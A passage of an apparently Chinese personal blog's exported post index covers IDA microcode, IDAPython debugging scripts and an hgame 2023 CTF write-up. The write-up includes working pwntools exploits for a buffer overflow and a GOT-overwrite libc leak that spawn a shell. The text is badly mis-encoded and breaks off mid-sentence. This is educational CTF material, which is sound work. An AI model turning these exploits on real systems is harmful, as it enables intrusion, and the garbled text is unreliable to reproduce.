CTreeï¼Œå¯ä»¥å®ç°ä¸€ä¸‹ä¼ªä»£ç å±•ç¤ºæ–¹é¢çš„ä¼˜åŒ–ï¼Œä¾‹å¦‚åˆ é™¤æŸäº›èŠ‚ç‚¹ç­‰ç­‰ã€‚ Microcode æŒ‡ä»¤æ ¼å¼ opcode left, right, destinationä¸€èˆ¬æ¥è¯´æœ‰ä¸‰ä¸ªæ“ä½œæ•°ï¼Œæœ‰ä¸€äº›æŒ‡ä»¤å¯èƒ½ç¼ºå°‘æŸä¸ªæ“ä½œæ•°ï¼Œdestination ä¹Ÿä¸ä¸€å®šä¼šè¢«ä¿®æ”¹ï¼ˆStore æŒ‡ä»¤ï¼‰ Microcode ä¸­å¸¸è§çš„æ•°æ®ç»“æ„ å‡½æ•°æ˜¯ IDA ä¸­æœ€å¤§çš„æ±‡ç¼–ç»“æœè¡¨ç¤ºå•ä½ å‡½æ•° â†’ åŸºæœ¬å— â†’ æŒ‡ä»¤ â†’ æ“ä½œæ•° Microcode å¯è§†åŒ–æ’ä»¶ https://github.com/gaasedelen/lucid Ctree å¯è§†åŒ–æ’ä»¶https://github.com/patois/HRDevHelper Microcodeç”Ÿæˆè¿‡ç¨‹ï¼š ç”Ÿæˆ Microcode å˜æ¢ Microcode ï¼ˆä¾‹å¦‚ä¼˜åŒ–ï¼‰ å±€éƒ¨å˜é‡åˆ†é… ç”Ÿæˆ CTree ï¼ˆCTree æ˜¯ IDA ç”¨æ¥è¡¨ç¤ºä¼ªä»£ç çš„æŠ½è±¡è¯­æ³•æ ‘ ASTï¼‰ ä¼˜åŒ– CTree è¾“å‡º CTree Microcode å¯„å­˜å™¨ microcode çš„å¯„å­˜å™¨æ²¡æœ‰æ•°é‡é™åˆ¶ï¼Œç‰©ç†å¯„å­˜å™¨å¾€å¾€ä¼šè¢«ç›´æ¥æ˜ å°„åˆ° microcode å¯„å­˜å™¨ï¼Œä¾‹å¦‚ AL is mapped into al.1 (mreg number 8) AH is mapped into ah.1 (mreg number 9) EAX is mapped into eax.4 (mreg numbers 8-11) RSI is mapped into rsi.8 Microcode åˆ†é˜¶æ®µç”Ÿæˆ, æœ€åˆé˜¶æ®µç”Ÿæˆçš„ä»£ç éå¸¸å†—ä½™ Microcode å¿«é€Ÿä¸Šæ‰‹ï¼Œæ‰‹åŠ¨è°ƒç”¨ microcode ç”Ÿæˆ 1234567891011121314151617181920212223import ida_hexraysimport idaapidef print_microcode(func_ea): maturity = ida_hexrays.MMAT_GLBOPT3 # maturity: # MMAT_ZERO, //&lt; microcode ä¸å­˜åœ¨ # MMAT_GENERATED //&lt; å·²ç»ç”Ÿæˆçš„microcode # MMAT_PREOPTIMIED //&lt; é¢„å…ˆä¼˜åŒ–çš„passå·²å®Œæˆ # MMAT_LOCOPT //&lt; local æœ¬åœ°æ¯ä¸ªåŸºæœ¬å—çš„ä¼˜åŒ–å·²å®Œæˆ controlæ§åˆ¶æµå›¾ä¹Ÿå°±ç»ª # MMAT_CALLS //&lt; æ£€æµ‹è°ƒç”¨å‚æ•° # MMAT_GLBOPT1 //&lt; æ‰§è¡Œç¬¬ä¸€ä¸ªå…¨å±€ä¼˜åŒ–pass # MMAT_GLBOPT2 //&lt; å¤§å¤šæ•°å…¨å±€ä¼˜åŒ–passå·²å®Œæˆ # MMAT_GLBOPT3 //&lt; å®Œæˆæ‰€æœ‰çš„ä¼˜åŒ–ï¼Œmicrocodeè¢«ä¿®æ”¹ # MMAT_LVAR3 //&lt; åˆ†é…æ‰€æœ‰çš„å±€éƒ¨å˜é‡ hf = ida_hexrays.hexrays_failure_t() pfn = idaapi.get_func(func_ea) rng = ida_hexrays.mba_ranges_t(pfn) mba = ida_hexrays.gen_microcode(rng,hf,None, ida_hexrays.DECOMP_WARNINGS,maturity) vp = ida_hexrays.vd_printer_t() mba._print(vp)print_microcode(0x1229) Microcode ç›¸å…³çš„æ•°æ®ç»“æ„ï¼Œå®šä¹‰åœ¨ hexrays.hpp æ–‡ä»¶ Microcode ç›¸å…³çš„æ•°æ®ç»“æ„: mbl_array_t,è¿™ä¸ªç»“æ„ç”¨æ¥å­˜æ”¾å‡½æ•°çš„åŸºæœ¬å—ä¿¡æ¯ åŸºæœ¬å—ä¹‹é—´ä½¿ç”¨åŒå‘é“¾è¡¨é“¾æ¥ åŸºæœ¬å—æ•°ç»„å­˜æ”¾åœ¨ natural æ•°ç»„ Microcode ç›¸å…³çš„æ•°æ®ç»“æ„: mblock_t,è¿™ä¸ªç»“æ„ç”¨æ¥æè¿°åŸºæœ¬å—ä¿¡æ¯ã€‚Â±åŸºæœ¬å—å†…çš„æŒ‡ä»¤ä¸æŒ‡ä»¤ä¹‹é—´ä½¿ç”¨åŒå‘é“¾è¡¨é“¾æ¥ Microcode ç›¸å…³çš„æ•°æ®ç»“æ„: minsn_tã€‚ç”¨äºæè¿°æŒ‡ä»¤ä¿¡æ¯çš„ç»“æ„ã€‚ï¼ˆæ³¨æ„å¾®ç æŒ‡ä»¤æ”¯æŒæŒ‡ä»¤åµŒå¥—ã€‚ï¼‰ Microcode ç›¸å…³çš„æ•°æ®ç»“æ„: mop_t ç”¨äºæè¿°æ“ä½œæ•°ä¿¡æ¯çš„ç»“æ„ï¼ŒæŒ‡ä»¤ minsn_t æœ‰ 0 ~ 3 ä¸ªæ“ä½œæ•°ï¼Œåˆ†åˆ«æ—¶ l (left), r (right), d (destination) æ“ä½œæ•°çš„ç±»å‹ç”¨ mop_t æ¥è¡¨ç¤º Microcode æ’ä»¶ä¾‹å­ å®ç° svc 0x900001 ä¸ svc 0x9000F8 æŒ‡ä»¤åç¼–è¯‘æˆä¸€æ¡ call æŒ‡ä»¤ install_microcode_filter æ³¨å†Œ microcode filter å®ç°æ‹¦æˆªæŒ‡ä»¤ç¿»è¯‘ microcode filter æ˜¯ä¸€ç§å¯ä»¥æ‹¦æˆª microcode æŒ‡ä»¤ç”Ÿæˆçš„æœºåˆ¶ï¼Œå¼€å‘è€…éœ€è¦ç»§æ‰¿ microcode_filter_t ç±»å¹¶å®ç° match ä¸ apply ä¸¤ä¸ªå‡½æ•°ã€‚ ida åœ¨ç”ŸæˆæŸä¸€æ¡æŒ‡ä»¤çš„ microcode ä¹‹å‰ä¼šè°ƒç”¨æ‰€æœ‰å·²ç»æ³¨å†Œçš„ filter çš„ match å‡½æ•°ï¼Œè‹¥ match å‡½æ•°è¿”å› Trueï¼Œåˆ™è°ƒç”¨å¯¹åº”çš„ apply å‡½æ•°å®ç°æŒ‡ä»¤æ›¿æ¢ã€‚ æˆ‘ä»¬éœ€è¦å°† svc æŒ‡ä»¤æ›¿æ¢æˆ call æŒ‡ä»¤ï¼Œida å·²ç»ä¸ºæˆ‘ä»¬å®ç°äº†æ›¿æ¢ç±» udc_filter_t, è¿™ä¸ªç±»ç»§æ‰¿äº microcode_filter_t å¹¶å®ç°äº† apply æ–¹æ³•ï¼ˆå³æ›¿æ¢callæŒ‡ä»¤ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ç»§æ‰¿ udc_filter_t å¹¶å®ç°å®ƒçš„ match æ–¹æ³•ç”¨äºåˆ¤æ–­æ‹¦æˆªçš„æŒ‡ä»¤ã€‚ Microcode æ’ä»¶ä¾‹å­","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"IDAPython","slug":"IDAPython","date":"2023-01-19T09:52:02.000Z","updated":"2023-01-19T10:41:38.027Z","comments":true,"path":"2023/01/19/IDAPython/","link":"","permalink":"https://pa1r0t.github.io/2023/01/19/IDAPython/","excerpt":"è®°å½•idaè„šæœ¬","text":"è®°å½•idaè„šæœ¬ IDA Python è„šæœ¬ç¼–ç¨‹å†…å­˜åˆ†ä¸ºï¼š æœ¬åœ°å†…å­˜ è°ƒè¯•å†…å­˜ å¸¸ç”¨è„šæœ¬æ¥å£ä»‹ç»å¯„å­˜å™¨æ“ä½œï¼ˆè°ƒè¯•ï¼‰ 12idc.get_reg_value(&#x27;raxâ€™)idaapi.set_reg_val(&quot;rax&quot;, 1234) è¯»å– xmm å¯„å­˜å™¨ 1234def read_xmm_reg(name): rv = idaapi.regval_t() idaapi.get_reg_val(name,rv) return (struct.unpack(&quot;Q&quot;,rv.bytes())[0]) è°ƒè¯•å†…å­˜æ“ä½œ dbg æ˜¯æŒ‡debugå†…å­˜ï¼ˆè°ƒè¯•å†…å­˜ï¼‰ 123456idc.read_dbg_byte(addr)idc.read_dbg_word(addr)idc.read_dbg_dword(addr)idc.read_dbg_qword(addr)idc.read_dbg_memory(addr,size)idc.patch_dbg_byte(addr,val) è°ƒè¯•å†…å­˜è¯»å†™å°è£… 123456789def patch_dbg_mem(addr,data): for i in range(len(data)): idc.patch_dbg_byte(addr+i,data[i]) def read_dbg_mem(addr,size): dd = [] for i in range(size): dd.append(idc.read_dbg_byte(addr+i)) return bytes(dd) æœ¬åœ°å†…å­˜æ“ä½œï¼ˆä¼šä¿®æ”¹idbæ•°æ®åº“ï¼‰ 123456idc.get_qword(addr)idc.patch_qword(addr,val)idc.patch_dword(addr,val)idc.patch_word(addr,val)idc.patch_byte(addr,val)idc.get_bytes(addr,size) åæ±‡ç¼–æ“ä½œ 12idc.GetDisasm(addr) # åªèƒ½è¿”å›ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤idc.next_head(addr) # è·å–ä¸‹ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤çš„åœ°å€ äº¤å‰å¼•ç”¨åˆ†æ 12for ref in idautils.XrefsTo(ea): print(hex(ref.frm)) æ‚é¡¹å¸¸ç”¨æ¥å£ 12345idc.add_bpt(addr) # æ·»åŠ æ–­ç‚¹idaapi.get_imagebase() # è·å–åŸºåœ°å€idc.create_insn(addr) # ç”Ÿæˆæ±‡ç¼–æŒ‡ä»¤ï¼Œç›¸å½“äºå¿«æ·é”®C å¸¸ç”¨äºå›ºä»¶åˆ†æida_funcs.add_func(addr) # ç”Ÿæˆå‡½æ•°ï¼Œç›¸å½“äºå¿«æ·é”®pida_bytes.create_strlit(addr) # ç”Ÿæˆå­—ç¬¦ä¸²ï¼Œç›¸å½“äºå¿«æ·é”®A å‡½æ•°éå† 12for func in idautils.Functions(): print(&quot;0x%x,%s&quot; % (func,idc.get_func_name(func))) åŸºæœ¬å—çš„éå† 12345678910fn = ç›®æ ‡å‡½æ•°åœ°å€f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)for blocks in f_blocks: print(hex(blocks.start_ea)) # åŸºæœ¬å—çš„å‰é©± for pre in blocks.preds(): print(hex(pre.start_ea)) # åŸºæœ¬å—çš„åç»§ for sucess in blocks.succs(): print(hex(sucess.start_ea)) æŒ‡ä»¤éå† 12for ins in idautils.FuncItems(addr): print(hex(ins)) å®æˆ˜éƒ¨åˆ†ollvmæ‰¹é‡æ–­ç‚¹è®¾ç½®ï¼š å®éªŒææ–™ï¼šollvm-flat æ³¨æ„ï¼šåˆ¤æ–­çœŸå®å—çš„ä¾æ®æ˜¯æŸ¥æ‰¾ ollvm æ±‡é›†ç‚¹åŸºæœ¬å—çš„äº¤å‰å¼•ç”¨ï¼Œä¸ä¸€å®šå‡†ç¡® æ–­ç‚¹è„šæœ¬ï¼š 123456789101112131415161718import idcimport idaapiimport structimport idautils# ollvmå‡½æ•°åœ°å€fn = 0x401F60# ollvmåŸºæœ¬å—æ±‡é›†åœ°å€ollvm_tail = 0x405D4B# æ‹¿åˆ°å‡½æ•°åŸºæœ¬å—çš„è¿­ä»£å™¨f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)# ç„¶åéå†å‡½æ•°åŸºæœ¬å—for block in f_blocks: # æ‹¿åˆ°æ¯ä¸ªåŸºæœ¬å—çš„åé©± for sucess in block.succs(): if sucess.start_ea == ollvm_tail: print(hex(block.start_ea)) idc.add_bpt(block.start_ea) å¤åˆ¶åˆ°idaä¸‹é¢ï¼Œæ‘å›è½¦ä¸¤æ¬¡å°±è¡Œ æˆåŠŸæ‰“ä¸Šæ–­ç‚¹ï¼Œæ‰“ä¸Šæ–­ç‚¹çš„åŸºæœ¬å—éƒ½æ˜¯çœŸå®å— æ–­ç‚¹ç®¡ç† å…¨é€‰å³é”®ç”Ÿæˆæ–‡ä»¶å¤¹ ç‚¹å‡»æ–‡ä»¶å¤¹ï¼Œè¿›è¡Œæ–­ç‚¹çš„æ‰¹é‡ç¦ç”¨æˆ–å¯ç”¨ æ¡ä»¶æ–­ç‚¹è„šæœ¬ç¼–å†™ï¼š å®éªŒææ–™ï¼šdump_test.exe ç›®æ ‡ï¼šè®¾ç½®ä¸€ä¸ªæ¡ä»¶æ–­ç‚¹ï¼Œå½“ rand å‡½æ•°è¿”å›å€¼ä¸º 16949 æ—¶åœä¸‹ æ‰¾åˆ°randomå‡½æ•° è®¾ç½®æ–­ç‚¹ åœ¨æ–­ç‚¹å¤„å³é”®ç¼–è¾‘æ–­ç‚¹ è„šæœ¬ï¼š 12345678import idcimport idaapiimport structimport idautilsdef bp(): rax = idc.get_reg_value(&#x27;rax&#x27;) return rax == 16949 å…ˆåœ¨idaä¸­æ‰§è¡Œè„šæœ¬ ç„¶åç¼–è¾‘æ–­ç‚¹ï¼Œå¢åŠ conditionæ¡ä»¶ ç„¶åè¿è¡Œç¨‹åº ç¨‹åºåœä¸‹æ¥åï¼Œå°±æŸ¥çœ‹raxå¯„å­˜å™¨ï¼Œç»è¿‡16è¿›åˆ¶è½¬10è¿›åˆ¶ï¼Œç»“æœæ­£ç¡® æ¡ä»¶æ–­ç‚¹è¿ç”¨ï¼šdump rand å‡½æ•°æ¯ä¸€æ¬¡æ‰§è¡Œç»“æœï¼Œä¸è®©ç¨‹åºåœä¸‹æ¥ è„šæœ¬ï¼šæ¡ä»¶æ–­ç‚¹å‡½æ•°è¿”å› Falseï¼ŒIDA ä¸ä¼šå‘½ä¸­è¯¥æ–­ç‚¹,åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æå–è¿è¡Œæ—¶æ•°æ® 1234def bp(): rax = idc.get_reg_value(&#x27;rax&#x27;) print(rax,end=&#x27;,&#x27;) return False","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"hgame2023","slug":"hgame2023","date":"2023-01-14T02:09:49.000Z","updated":"2023-02-14T02:36:57.723Z","comments":true,"path":"2023/01/14/hgame2023/","link":"","permalink":"https://pa1r0t.github.io/2023/01/14/hgame2023/","excerpt":"å¤ç°hgame","text":"å¤ç°hgame week1cryptoå…”å…”çš„è½¦ç¥¨é¢˜ç›®ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(&#x27;flag.png&#x27;)width = flagImg.widthheight = flagImg.heightdef makeSourceImg(): colors = long_to_bytes(getrandbits(width * height * 24))[::-1] #ç”Ÿæˆå›¾åƒå§ img = Image.new(&#x27;RGB&#x27;, (width, height)) x = 0 #å†™åƒç´  for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return imgdef xorImg(keyImg, sourceImg): # ç”Ÿæˆå›¾ç‰‡ img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgn1 = makeSourceImg()n2 = makeSourceImg()n3 = makeSourceImg()nonce = [n1, n2, n3] #ä¸‰å¼ å›¾ç‰‡index = list(range(16)) #ç”Ÿæˆ0~16çš„åºåˆ—shuffle(index) # æ‰“ä¹±åºåˆ—e=0&quot;&quot;&quot;è¿™é‡Œflag.pngå·²ç»æå‰è¢«ä¿å­˜åœ¨sourceæ–‡ä»¶å¤¹ä¸‹äº†ï¼Œæ–‡ä»¶åä¹Ÿæ˜¯picture&#123;xx&#125;.png&quot;&quot;&quot;for i in index: im = Image.open(f&quot;source/picture&#123;i&#125;.png&quot;) key = nonce[randint(0, 2)] encImg = xorImg(key, im) encImg.save(f&#x27;pics/enc&#123;e&#125;.png&#x27;) e+=1 è§£æ³•ï¼šåŸå…ˆæˆ‘çœ‹ç€åªæœ‰enc.png,å…¶ä»–å•¥éƒ½æ²¡æœ‰ï¼Œæ€ä¹ˆä¸ªå¼‚æˆ–ï¼Ÿåæ¥ä¹Ÿæ³¨æ„åˆ°keyåªæœ‰ä¸‰ä¸ªï¼Œè€ƒè™‘è¿‡é‡å¤çš„æƒ…å†µï¼Œä½†æ˜¯æˆ‘å‘ç°ä»…æœ‰ä¸€ä¸ªenc.png,è¿˜æ˜¯æ²¡æ³•æå‡ºåŸå›¾ï¼Œåæ¥çœ‹äº†åˆ«äººçš„wpï¼Œæ‰çŸ¥é“ï¼Œåªè¦flag.png^picture.pngå°±è¡Œï¼Œå› ä¸ºå®ƒçš„picture.pngåŸæœ¬çš„å°±æ²¡å•¥åƒç´ ï¼Œenc.pngå¤§éƒ¨åˆ†è¿˜æ˜¯keyçš„åƒç´ ï¼Œæ‰€ä»¥æ‰¾åˆ°ä¸€å¼ å­˜åœ¨flag.pngçš„å›¾ç‰‡ï¼Œå°†keyå¼‚æˆ–æ‰å°±è¡Œï¼Œæœ€ç»ˆè™½ç„¶å¾—ä¸åˆ°çœŸæ­£å¾—flag.pngä½†æ¨¡ç³Šç¨‹åº¦ä¹Ÿä¸é«˜ã€‚è¿™é‡Œå¯¹16å¼ å›¾ç‰‡ç¬›å¡å°”ç§¯çº§åˆ«å¼‚æˆ–å°±è¡Œ æœ€åè§£å¯†ä»£ç ï¼š 123456789101112131415161718192021222324252627from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(f&#x27;pics/enc&#123;0&#125;.png&#x27;)width = flagImg.widthheight = flagImg.heightflagImg.close()def xorImg(keyImg, sourceImg): # ç”Ÿæˆå›¾ç‰‡ img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgfor i in range(16): for j in range(16): imi = Image.open(f&quot;pics/enc&#123;i&#125;.png&quot;) imj = Image.open(f&quot;pics/enc&#123;j&#125;.png&quot;) xorimg = xorImg(imj, imi) xorimg.save(f&#x27;source/xor&#123;i*16+j&#125;.png&#x27;) imi.close() imj.close() æœ€åè·å¾—æ¨¡ç³Šçš„flagå›¾ç‰‡ï¼š ç¥ç§˜çš„ç”µè¯é¢˜ç›®ï¼š ä¸€ä¸ªç–‘ä¼¼base64ç¼–ç çš„txtæ–‡ä»¶ ä¸€ä¸ªæ’­æ”¾èµ·æ¥æ˜¯ä¸€ä¸ªæ‘©æ–¯å¯†ç çš„wavæ–‡ä»¶ è§£æ³•ï¼š æå–å‡ºå£°éŸ³æ–‡ä»¶çš„ä¿¡æ¯ï¼š 1morse2ascii morse.wav base64è§£ç ï¼š ç¯±ç¬†ä¸€ä¸€&gt;æ …æ å¯†ç ï¼›å€’ç€ä¸€ä¸€&gt;é€†åºï¼›å¯†åŒ™ä¸€ä¸€&gt;ç»´å‰å°¼äºšå¯†ç ;åŒ—æ¬§ç¥è¯ä¸€ä¸€&gt;vidar ï¼ˆè¿™é‡Œç”¨morse2asciiè®¡ç®—å‡ºçš„æ•°æ®å¤šäº†ä¸€äº›ä¸‹åˆ’çº¿ï¼Œåšæ³•æ˜¯æ¯ä¸€å¤„ä¸‹åˆ’çº¿éƒ½å»æ‰ä¸€ä¸ªå°±è¡Œï¼‰ æœ€åflag: PWNeasy_overflowä»–å¦ˆçš„ï¼Œè¿™é“æ­»æ´»æä¸å‡ºæ¥ï¼Œçœ‹äº†wpæ‰çŸ¥é“æ˜¯closeå‡½æ•°å…³é—­äº†æ ‡å‡†è¾“å‡ºé€šé“ã€‚éœ€è¦åœ¨æ¥ä¸ªæŠ¥é”™è¾“å‡ºï¼ŒæŠŠç»“æœè¾“å‡ºè¿‡æ¥ é¢˜ç›®æ²¡å•¥å¥½è®²çš„ï¼Œç›´æ¥ä¸Šexp 123456789from pwn import *io = process(&#x27;./vuln&#x27;)# io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)elf = ELF(&#x27;./vuln&#x27;)# main_addr = elf.sym[&#x27;main&#x27;]back_addr = elf.sym[&#x27;b4ckd0or&#x27;]payload = b&#x27;A&#x27;*16 + p64(0) + p64(back_addr)io.sendline(payload)io.interactive() è¿ç”¨1&gt;&amp;2å°†ç»“æœä»æŠ¥é”™ä¿¡æ¯ä¸­è¾“å‡º choose_the_seat**HINTS:**æ•°ç»„ä¸‹æ ‡çš„æ£€æŸ¥å¥½åƒå°‘äº†ç‚¹ä¸œè¥¿ ä¸‹æ ‡v0æ²¡æœ‰æ£€æŸ¥ä¸‹ç•Œ seatsåœ¨bssæ®µï¼Œå¹¶åªæœ‰seatså†™å…¥ã€‚æ— æ³•è¿›è¡Œæ ˆæ“ä½œ æ€è·¯ï¼šè¿ç”¨è´Ÿä¸‹æ ‡è¿›è¡Œgotè¡¨è¦†ç›–ï¼Œç”¨gotè¡¨æ³„æ¼libcçš„åœ°å€ å…ˆç”¨vulnå‡½æ•°è¦†ç›–exitçš„åœ°å€ï¼Œé˜²æ­¢ç¨‹åºé€€å‡ºï¼Œæ–¹ä¾¿ä¸‹æ¬¡å†æ¬¡åˆ©ç”¨ å†ç”¨setbufçš„pltè¡¨è¿›è¡Œæ³„æ¼gotåœ°å€ï¼Œå†ç”¨æŒ‡å®šçš„libcè®¡ç®—åŸºåœ°å€ ç”¨åŸºåœ°å€è®¡ç®—systemçš„åœ°å€ï¼Œå†ç”¨systemçš„åœ°å€è¦†ç›–putsçš„åœ°å€ï¼Œputsåœ°å€çš„æ—è¾¹æ­£å¥½å¯ä»¥å­˜æ”¾binshçš„åœ°æ–¹ï¼Œè¿ç€binshä¸€èµ·è¦†ç›–äº† expï¼š 123456789101112131415161718192021222324252627282930313233343536from pwn import *io = process(&#x27;./vuln&#x27;)# io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30536)context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]context.log_level = &#x27;debug&#x27;def b(): gdb.attach(io) pause()elf = ELF(&quot;./vuln&quot;)libc = ELF(&#x27;./libc-2.31.so&#x27;)vuln_addr = elf.sym[&#x27;vuln&#x27;]sys_libc = libc.sym[&#x27;system&#x27;]libc_setbuf_addr = libc.sym[&#x27;setbuf&#x27;]print(&#x27;setbuf:&#x27;,hex(libc_setbuf_addr))io.sendlineafter(b&#x27;one.&#x27;,str(-6))io.sendafter(b&#x27;your name&#x27;,p64(vuln_addr))print(&quot;vuln&quot;,vuln_addr)b()io.sendlineafter(b&#x27;one.&#x27;,str(-8))io.sendafter(b&#x27;your name&#x27;,b&#x27;\\xd0&#x27;)io.recvuntil(b&#x27;name is &#x27;)setbuf_addr = u64(io.recvuntil(&#x27;Your seat&#x27;).split(b&#x27;\\nYour&#x27;)[0].ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(setbuf_addr))base_addr = setbuf_addr - libc_setbuf_addrsys_addr = base_addr + sys_libcio.sendlineafter(b&#x27;one.&#x27;,str(-9))payload = b&#x27;/bin/sh\\x00&#x27; + p64(sys_addr)io.sendafter(b&#x27;your name&#x27;,payload)io.interactive() è¿™é‡Œåœ¨è¦†ç›–setbufçš„åœ°å€æ—¶ä¼šå†™ä¸€ä¸ªå­—æ¯ï¼Œå­—æ¯æ‰€å ä½ç½®ä¸è¶…è¿‡0x1000ï¼Œå› ä¸ºä¸€ä¸ªå†…å­˜é¡µå°±æ˜¯0x1000ï¼Œæ‰€ä»¥æ— è®ºåŸºåœ°å€å¦‚ä½•å˜ï¼Œå‡½æ•°åœ¨å†…å­˜é¡µä¸­çš„åç§»åœ°å€ä¸å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ªå­—æ¯ä¹Ÿåªæ˜¯å ç”¨äº†åç§»ä½ç½®ï¼Œå¯¹è®¡ç®—åŸºåœ°å€å¹¶ä¸ä¼šå½±å“ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹æŒ‡å®šlibcä¸­çš„setbufï¼ˆé™æ€ï¼‰ï¼Œå°†å¾—åˆ°çš„setbufçš„åœ°å€çš„åç§»æ•°å€¼å’Œæˆ‘ä»¬æ³„æ¼å‡ºçš„åç§»æ•°å€¼æ”¹æˆç›¸åŒï¼Œå†å‡å»æˆ‘ä»¬æ³„æ¼å‡ºçš„æ€»å€¼å°±èƒ½å¾—åˆ°base_addr ä¸‹é¢æŠŠd0æ¢æˆ41å°±è¡Œï¼Œ41å°±æ˜¯æˆ‘ä»¬å†™è¿›å»çš„â€™Aâ€™ å¦‚ä½•è¿™é‡Œå‡å»æ€»å€¼ï¼š è¿™é‡Œè¿˜æœ‰ä¸€ç§åšæ³•å°±æ˜¯å†™å…¥\\xd0,å°±æ˜¯è®©åœ°å€ä¸å‘ç”Ÿå˜åŒ–ï¼Œè¿™æ ·è®¡ç®—åŸºåœ°å€ç›´æ¥å‡å»symä¸­æ‰¾çš„åœ°å€å°±è¡Œï¼Œå…¶å®è¿™ç§åšæ³•ä¹Ÿå°±æ–¹ä¾¿äº†ä¸€ç‚¹ç‚¹ 1234io.sendafter(b&#x27;your name&#x27;,b&#x27;\\xd0&#x27;)io.recvuntil(b&#x27;name is &#x27;)setbuf_addr = u64(io.recvuntil(&#x27;Your seat&#x27;).split(b&#x27;\\nYour&#x27;)[0].ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(setbuf_addr)) binshçš„åœ°å€æ­£å¥½æ˜¯ä¸‹æ ‡0x10çš„æ•´æ•°å€ï¼Œç„¶ååé¢å°±æ˜¯putsçš„åœ°å€ï¼Œå¯ä»¥è¯´å‡ºé¢˜äººåˆ«æœ‰ç”¨å¿ƒäº† è¿™é‡Œæœ‰ä¸¤ç§åšæ³•ï¼Œä¸€ç§æ˜¯ä»-9è¿™ä¸ªä¸‹æ ‡å†™å…¥binshçš„å­—ç¬¦ä¸²å’Œsystemçš„åœ°å€ï¼Œè®©ç¨‹åºè°ƒç”¨putsé—´æ¥è°ƒç”¨sytemå‡½æ•° ç¬¬äºŒç§åšæ³•å°±æ˜¯ç”¨one_gadgetæŸ¥æ‰¾libcä¸­ï¼Œæ‰§è¡Œbinshçš„æŒ‡ä»¤ è¿™é‡Œå…¶å®æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œè¦æ±‚ä¸€äº›å¯„å­˜å™¨ä¸­çš„åœ°å€å¯¹åº”çš„å†…å®¹ä¸ºnullï¼Œè¿™é‡Œå­˜åœ¨å¶ç„¶æ€§ï¼Œä¸è¿‡ä¹Ÿæ˜¯å¯ä»¥çš„ æ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸€ç§æ–¹æ³• 123io.sendlineafter(b&#x27;one.&#x27;,str(-9))payload = b&#x27;/bin/sh\\x00&#x27; + p64(sys_addr)io.sendafter(b&#x27;your name&#x27;,payload) è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆæ‰“å¼€tmuxç»ˆç«¯ï¼Œåœ¨tmuxè¿è¡Œexpï¼Œå‰ææ˜¯expè®¾ç½®äº†context.terminal &#x3D; [â€œtmuxâ€,â€splitwâ€,â€-hâ€]ï¼Œç„¶åè¿›è¡Œgdb.attch è¿™é‡Œæ–¹ä¾¿èµ·è§æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªè°ƒè¯•å‡½æ•°ï¼Œæ–¹ä¾¿expè¿è¡Œæ—¶ä¸´æ—¶è°ƒè¯•ç¨‹åº 123def b(): gdb.attach(io) pause() å°†è¿™ä¸ªå‡½æ•°æ”¾ç½®åˆ°æˆ‘ä»¬æƒ³è°ƒè¯•çš„åœ°æ–¹ æ•ˆæœï¼š ç„¶åå†gdbå…ˆåè¾“å…¥gotä¸€ä¸€&gt;p&#x2F;x *(åœ°å€),å°±å¯ä»¥æŸ¥çœ‹æŸä¸ªgotä¸­çš„å†…å®¹äº† è¿™é‡Œåæ§½ä¸€ä¸‹ï¼Œå…¶å®gdbæ–°ç‰ˆæœ¬å¯ä»¥ç›´æ¥çœ‹åˆ°gotè¡¨çš„å†…å®¹ï¼Œæˆ‘è¿™ä¸ªgdbå·²ç»æ˜¯ubuntu20.02çš„æœ€é«˜ç‰ˆæœ¬äº†ï¼Œæˆ‘è¿™ä¸ªdockerå°±ä¸æŠ˜è…¾äº† ï¼ˆPIEå…¨ç§°æ˜¯position-independent executableï¼Œä¸­æ–‡è§£é‡Šä¸ºåœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¯¥æŠ€æœ¯æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»£ç æ®µï¼ˆ.textï¼‰ã€æ•°æ®æ®µï¼ˆ.dataï¼‰ã€æœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼ˆ.bssï¼‰ç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ï¼Œå¦‚æœç¨‹åºå¼€å¯äº†PIEä¿æŠ¤çš„è¯ï¼Œåœ¨æ¯æ¬¡åŠ è½½ç¨‹åºæ—¶éƒ½å˜æ¢åŠ 